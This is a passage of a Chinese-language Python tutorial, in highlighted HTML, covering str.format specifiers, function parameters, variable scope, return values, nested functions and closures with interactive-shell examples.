string\">'&#123;:d&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:o&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:x&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:e&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">2.000000e+01</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:g&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">20.1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">20.000000</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:n&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:%&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token number\">2000.000000</span><span class=\"token operator\">%</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>进阶用法<br />\n进制转换 (2 进制、8 进制、10 进制、16 进制)</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token comment\"># format also supports binary numbers</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">\"int: &#123;0:d&#125;;  hex: &#123;0:x&#125;;  oct: &#123;0:o&#125;;  bin: &#123;0:b&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'int: 42;  hex: 2a;  oct: 52;  bin: 101010'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token comment\"># with 0x, 0o, or 0b as prefix:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">\"int: &#123;0:d&#125;;  hex: &#123;0:#x&#125;;  oct: &#123;0:#o&#125;;  bin: &#123;0:#b&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 在前面加 “#”，则带进制前缀</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">'int: 42;  hex: 0x2a;  oct: 0o52;  bin: 0b101010'</span></pre></td></tr></table></figure><ol start=\"4\">\n<li>左中右对齐及位数补全<br />\n (1)&lt; （默认）左对齐、&gt; 右对齐、^ 中间对齐、= （只用于数字）在小数点后进行补齐<br />\n (2) 取位数 “{:4s}”、&quot;{:.2f}&quot; 等</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; and &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 默认左对齐</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hello <span class=\"token keyword\">and</span> world</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:10s&#125; and &#123;:>10s&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 10 位左对齐，取 10 位右对齐</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>hello      <span class=\"token keyword\">and</span>      world</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;:^10s&#125; and &#123;:^10s&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'world'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 10 位中间对齐</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  hello    <span class=\"token keyword\">and</span>   world   </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; is &#123;:.2f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.123</span><span class=\"token punctuation\">,</span><span class=\"token number\">1.123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 2 位小数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">1.123</span> <span class=\"token keyword\">is</span> <span class=\"token number\">1.12</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;0&#125; is &#123;0:>10.2f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取 2 位小数，右对齐，取 10 位</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">1.123</span> <span class=\"token keyword\">is</span>       <span class=\"token number\">1.12</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:&lt;30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'left aligned'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 左对齐</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">'left aligned                  '</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:>30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'right aligned'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 右对齐</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token string\">'                 right aligned'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:^30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'centered'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 中间对齐</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token string\">'           centered           '</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:*^30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'centered'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 使用 “*” 填充</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token string\">'***********centered***********'</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span><span class=\"token string\">'&#123;:0=30&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 还有 “=” 只能应用于数字，这种方法可用 “>” 代替</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token string\">'000000000000000000000000000011'</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>正负符号显示</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:+f&#125;; &#123;:+f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 总是显示符号</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">'+3.140000; -3.140000'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;: f&#125;; &#123;: f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 若是 + 数，则在前面留空格</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token string\">' 3.140000; -3.140000'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:-f&#125;; &#123;:-f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">3.14</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># - 数时显示 -，与 '&#123;:f&#125;; &#123;:f&#125;' 一致</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">'3.140000; -3.140000'</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>百分数 %</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> points <span class=\"token operator\">=</span> <span class=\"token number\">19</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> total <span class=\"token operator\">=</span> <span class=\"token number\">22</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'Correct answers: &#123;:.2%&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>points<span class=\"token operator\">/</span>total<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token string\">'Correct answers: 86.36%'</span></pre></td></tr></table></figure><ol start=\"7\">\n<li>时间</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">import</span> datetime</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> d <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">(</span><span class=\"token number\">2010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">58</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:%Y-%m-%d %H:%M:%S&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token string\">'2010-07-04 12:15:58'</span></pre></td></tr></table></figure><ol start=\"8\">\n<li>逗号 &quot;,&quot; 分隔金钱，以千进位</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">'&#123;:,&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token number\">1234567890</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">'1,234,567,890'</span></pre></td></tr></table></figure><h2 id=\"函数\"><a class=\"anchor\" href=\"#函数\">#</a> 函数</h2>\n<p>函数文档__doc__() 调用</p>\n<h3 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> 参数</h3>\n<p>参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p>\n<p>a. 形参：形式参数，没有实际作用<br />\n①必备参数：也加位置参数，用户调用函数时，必须要传入的参数</p>\n<p>② 缺省参数：用户调用函数时，可以不用传入的参数 eg.def a (a1=1,a2=2) <em><strong>定义默认参数要牢记一点：默认参数必须指向不变对象！</strong></em>  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMC8xMDE3MjYxNjMwNDI1ODg4\">https://www.liaoxuefeng.com/wiki/1016959663602400/1017261630425888</span> 中有详细介绍。</p>\n<p>③关键字参数：用户调用函数时，必须通过 “形参名 = 实参名 / 值” 格式传入的参数  eg. def a (a1,a2) a (a1=1,a2=2) →函数调用</p>\n<p>定义命名的关键字参数在没有可变参数的情况下不要忘了写分隔符 *，否则定义的将是位置参数。</p>\n<p>④不定长参数</p>\n<ol>\n<li>\n<p>*args：接收任意多个单值，组成一个元组</p>\n</li>\n<li>\n<p>**kwargs：接收任意多个键值对，组成一个字典</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'name:'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> <span class=\"token string\">'age:'</span><span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">,</span> <span class=\"token string\">'other:'</span><span class=\"token punctuation\">,</span> kw<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>b. 实参：实际参数，真正参与函数的运算</p>\n<h3 id=\"函数变量的作用域\"><a class=\"anchor\" href=\"#函数变量的作用域\">#</a> 函数变量的作用域</h3>\n<p>Python 的全局变量与局部变量。</p>\n<p>如果在函数内部试图去修改全局变量，Python 会使用屏蔽（Shadowing）方式 “保护” 全局变量：一旦函数内部去修改全局变量，Python 就会在函数内部自动创建一个名字一模一样的局部变量，这样修改的结果只会修改到局部变量，而不会影响到全局变量。</p>\n<p>如果你有必要在函数中修改这个全局，那么你可以使用 global 关键字来打到目的<br />\n实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> c <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">h</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">global</span> c</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tc <span class=\"token operator\">=</span> <span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> h<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> c</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr></table></figure><h3 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h3>\n<p>当不写 return 语句的时候，默认 Python 会认为函数会 return None 的。<br />\n所以说 python 所有的函数都有返回值。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">h</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"666\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> h<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#-------------------------------------------------------#</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#当返回多个值时，默认会使用元组</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'nb'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'nb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'tuple'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"内嵌函数\"><a class=\"anchor\" href=\"#内嵌函数\">#</a> 内嵌函数</h3>\n<p>Python 的函数定义是可以嵌套的，允许在函数内部创建另一个函数，这种函数叫做内嵌函数或者内部函数。</p>\n<p>不举例了</p>\n<p>注意函数的定义域<br />\n函数 1 里定义的函数 2 只能在函数 1 里使用。(废话嘛这不)</p>\n<h3 id=\"闭包closure\"><a class=\"anchor\" href=\"#闭包closure\">#</a> 闭包 (closure)</h3>\n<p>闭包是函数式编程的一个重要的语法结构，函数式编程是一种编程范式，著名的函数式编程语言就是 LISP 语言。</p>\n<p>不同编程函数实现闭包的方式不同，Python 中的闭包从变现形式上定义为：如果在一个内部函数里，对在外部作用域（但不是全局作用域）的变量进行引用，内部函数就被认为是闭包（closure）。</p>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t    <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t    <span class=\"token keyword\">return</span> x <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t    <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> l <span class=\"token operator\">=</span> funx<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> l<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">36</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">## 也可以这样写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">36</span></pre></td></tr></table></figure><p>通过上面的例子理解闭包的概念：如果在一个内部函数里（funy 就是这个内部函数）对外部作用域（但不全是在全局作用域）的变量进行引用（x 就是被引用的变量，x 在外部作用域 funx 函数里面，但不在全局作用域里），则为这个内部函数就是一个闭包。</p>\n<p>把一个变量变成了一个函数</p>\n<p>使用闭包函数需要注意的是：因为闭包的概念就是有内部函数而来的，所以你也不能在外部函数以外的地方对内部函数进行调用。（很显然呀）</p>\n<p>还有一个问题</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        x<span class=\"token operator\">=</span><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            x <span class=\"token operator\">*=</span> x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#29>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#28>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> funy</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    x <span class=\"token operator\">*=</span> x</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>UnboundLocalError<span class=\"token punctuation\">:</span> local variable <span class=\"token string\">'x'</span> referenced before assignment</pre></td></tr></table></figure><p>这个报错原因跟全局变量的那个一样，Python 认为在内部函数的 x 是局部变量的时候，外部函数的 x 就被屏蔽了起来，所以在右边根本就找不到局部变量 x 的值，因此报错。</p>\n<p>在 Python3 